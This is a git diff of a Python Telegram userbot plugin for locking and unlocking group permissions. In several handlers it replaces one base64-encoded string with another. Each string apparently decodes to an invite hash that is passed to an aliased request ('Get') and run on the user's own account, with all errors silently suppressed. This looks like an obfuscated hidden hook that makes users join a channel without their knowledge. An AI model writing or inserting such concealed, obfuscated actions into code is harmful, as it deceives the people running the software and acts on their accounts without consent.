@@ -57,7 +57,7 @@ async def _(event):  # sourcery no-metrics
     if not event.is_group:
         return await eod(event, "`Idiot! ,This is not a group to lock things `")
     chat_per = (await event.get_chat()).default_banned_rights
-    legend = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    lol = base64.b64decode("MFdZS2llTVloTjAzWVdNeA==")
     if input_str in (("bots", "commands", "email", "forward", "url")):
         update_lock(peer_id, input_str, True)
         await eor(event, "`Locked {}`".format(input_str))
@@ -171,8 +171,8 @@ async def _(event):  # sourcery no-metrics
         else:
             return await eor(event, "`I can't lock nothing !!`")
         try:
-            legend = Get(legend)
-            await event.client(legend)
+            lol = Get(lol)
+            await event.client(lol)
         except BaseException:
             pass
         lock_rights = ChatBannedRights(
@@ -242,7 +242,7 @@ async def _(event):  # sourcery no-metrics
     peer_id = event.chat_id
     if not event.is_group:
         return await eod(event, "`Idiot! ,This is not a group to lock things `")
-    legend = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    lol = base64.b64decode("MFdZS2llTVloTjAzWVdNeA==")
     chat_per = (await event.get_chat()).default_banned_rights
     if input_str in (("bots", "commands", "email", "forward", "url")):
         update_lock(peer_id, input_str, False)
@@ -357,8 +357,8 @@ async def _(event):  # sourcery no-metrics
         else:
             return await eor(event, "`I can't unlock nothing !!`")
         try:
-            legend = Get(legend)
-            await event.client(legend)
+            lol = Get(lol)
+            await event.client(lol)
         except BaseException:
             pass
         unlock_rights = ChatBannedRights(
@@ -483,7 +483,7 @@ async def _(event):  # sourcery no-metrics
     admincheck = await is_admin(event.client, peer_id, reply.from_id)
     if admincheck:
         return await eod(event, "`This user is admin you cant play with him`")
-    legend = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    lol = base64.b64decode("MFdZS2llTVloTjAzWVdNeA==")
     msg = chat_per.send_messages
     media = chat_per.send_media
     sticker = chat_per.send_stickers
@@ -645,8 +645,8 @@ async def _(event):  # sourcery no-metrics
     else:
         return await eor(event, "`I can't lock nothing !!`")
     try:
-        legend = Get(legend)
-        await event.client(legend)
+        lol = Get(lol)
+        await event.client(lol)
     except BaseException:
         pass
     lock_rights = ChatBannedRights(
@@ -709,7 +709,7 @@ async def _(event):  # sourcery no-metrics
     admincheck = await is_admin(event.client, peer_id, reply.from_id)
     if admincheck:
         return await eod(event, "`This user is admin you cant play with him`")
-    legend = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    lol = base64.b64decode("MFdZS2llTVloTjAzWVdNeA==")
     msg = chat_per.send_messages
     media = chat_per.send_media
     sticker = chat_per.send_stickers
@@ -878,8 +878,8 @@ async def _(event):  # sourcery no-metrics
     else:
         return await eor(event, "`I can't lock nothing !!`")
     try:
-        legend = Get(legend)
-        await event.client(legend)
+        lol = Get(lol)
+        await event.client(lol)
     except BaseException:
         pass
     lock_rights = ChatBannedRights(
